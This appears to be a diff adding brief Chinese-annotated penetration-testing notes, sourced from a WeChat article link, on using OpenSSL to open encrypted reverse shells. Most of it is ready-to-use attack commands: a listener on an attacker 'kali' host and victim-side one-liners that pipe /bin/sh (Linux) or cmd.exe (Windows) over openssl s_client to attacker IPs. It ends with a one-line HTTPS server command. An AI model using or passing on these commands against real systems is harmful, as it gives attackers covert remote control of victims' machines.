@@ -1,0 +1,31 @@
+https://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247499270&idx=3&sn=53e64aa3bb989992bb76773b35a83b71&chksm=f9e3915dce94184b46b41c1cce5334a0b18f72773b5e5a918316e77717f5f04ca8a083ee1175&scene=27&key=52b3990c9c8a361bd26b088ab01d0bd5dd79003d2f36db95af502ca44ffad177f8998807bad9fdb376c80d8c9f8a14116239ae2021a0704681ee6280a7a2936afc3a3dcdb5d999295bf8e8452fa3b8dbf7009c5105892e1c7a19d205daf6129eb8f6fcaa939046cca8be1e146757f3d8ba07c37e30325e57c403168a1288f3e2&ascene=0&uin=MzgxODQ4MjMz&devicetype=Windows+Server+2016+x64&version=63010025&lang=zh_CN&export
+
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+
+Linux
+假设我们从 A 主机反弹 shell 到 B 主机
+
+kali:B
+openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
+
+victim A
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.16.1.174:1337 > /tmp/s; rm /tmp/s
+
+
+
+
+3.2 Windows
+
+victim A
+openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2]
+
+openssl s_client -quiet -connect 169.254.6.206:1231|cmd.exe |openssl s_client -quiet -connect 169.254.6.206:1232
+
+kali b
+openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1] 
+openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2]
+
+
+
+4. 使用 OpenSSL 搭建简易 HTTPS Server
+openssl s_server -key key.pem -cert cert.pem -accept 44330 -WWW
